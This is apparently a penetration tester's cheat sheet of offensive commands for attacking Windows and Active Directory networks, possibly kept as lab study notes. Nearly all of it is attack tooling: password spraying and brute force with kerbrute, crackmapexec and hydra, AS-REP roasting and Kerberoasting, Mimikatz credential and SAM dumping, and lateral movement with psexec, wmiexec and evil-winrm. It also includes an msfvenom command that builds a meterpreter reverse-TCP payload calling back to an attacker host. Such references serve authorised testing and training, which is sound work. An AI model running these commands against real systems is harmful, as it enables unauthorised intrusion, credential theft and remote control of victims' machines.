## Table of useful command

kerbrute	Enumerate
brute force/password spray	Enumeration: kerbrute userenum -d example.local --dc 192.168.1.10 users.txt

BruteForce: kerbrute bruteuser -d example.local --dc 192.168.1.10 administrator passwords.txt

users.txt file with user list
crackmapexec
https://www.youtube.com/watch?v=uLNpR3AnE-Y&list=PLbK3lpDL_g6ChnJ9E8LB30dezPfuzgaBI&index=2	Enum hosts
Enum null sess Enum anony access

	Get password Policy: cme <IP> -u ‘user’ -p ‘password” --pass-pol
DO IT BEFORE… THEN TUNE THE Pwd SPARY with policy obtained

Username but NO pwd: cme smb <dc_ip> -u user.txt - password.txt --no-bruteforce

Valid Credential: 
Users: cme smb <IP> -u <user> -p ‘<password_from_before>’ --users
Account: cme smb <IP> -u <user> -p ‘<password_from_before>’ --shares

Enumeration: crackmapexec smb <IP>
Enumeration: crackmapexec smb <IP> -u “ p” Enumeration: crackmapexec smb <IP> -u ‘a’ -p”

Lateral Movement: crackmapexec smb <IP> -u <user> -p <password> -d <domain>
evil-winrm	Access to target machine	Lateral Movement: evil-winrm -i 192.168.1.100 -u Administrator -p 'Password123'
xfreerdp	Access to target machine	Lateral Movement: xfreerdp /v:192.168.1.100 /u:Administrator /p:'Password123'
smbclient
	accedere a risorse SMB/CIFS	Lateral Movement: smbclient.py <domain>/<user>:<Password123>@<IP>

smbclient -L //<dc_ip>/
Enter-PSSession	Start interactive session	Enter-PSSession <domain>
Enter-PSSession seclogs.resesarch.security.local
net	Useful for policy settings	net accounts
net user administrator
runas	Access to victim	runas.exe /user:administrator cmd
@runas.exe /user:administrator cmd 
PowerView	Enumeration AD - Powersploit suite	AS-REP Roasting primary step: Get-DomainUser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH*" }
@Command: 

AD-Kerberoasting: Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
setspn -T research -Q */*
@Command: 
winpeas	Identify misconfigurations, permissions, and vulnerabilities that could be exploited to gain elevated privileges	Privilefge esclation: winpeas.exe
msfvenom	Used to generate a reverse_tcp payload	msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.5.101 LPORT=4444 -f exe > rTCP.exe
@Command: 
msfconsole	Metasploit module	msfconsole -q
Meterpreter session: exploit/windows/misc/hta_server
Mimikatz	Raj Metasploit for Pentester: Mimikatz - Hacking Articles	hashdump: hashdump
Return NTLM Hash of the user
creds_all: creds:all
Extract all possible hashes or credentials form Security Packages
lsa_dump_secrets: lsa_dump_secrets
Extract credential stored into Local Security Authority
lsa_dump_sam: lsa_dump_sam
Extract Security Account Manager and dumps credentials for local accounts
psexec	Execute command on target machine	psexec \\\\<target_ip> <cmd_command>
OR
use for PTH
wmiexec	Used to run command on target machine	python wmiexec.py username:password@target_ip "whoami"

fping	Ping ICMP machine to get alive	fping -a -g 192.168.1.0/24
GetNPUsers	Used to find hash	python GetNPUsers.py <domain>/ -userfile <username.txt> -format hashcat -outputfile <hash_out.txt>

rebeus.exe asreproast /format:hashcat
hashcat	Used to crack hash	hashcat -m <algorithm> -a <type_of_attack> hash.txt 
hydra	Brute force 	hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.0.0.89 smb2

wpscan	Wordpress vuln	@## detect plugins vulnerable
wpscan --url https://kihvhc2nhb0uocklpg88obt.eu-central-1.attackdefensecloudlabs.com/ --enumerate p --plugins-detection aggressive 
nmap	port scanning	nmap -sC -sV -Pn -p- -oA output.txt <IP_addr> -vv
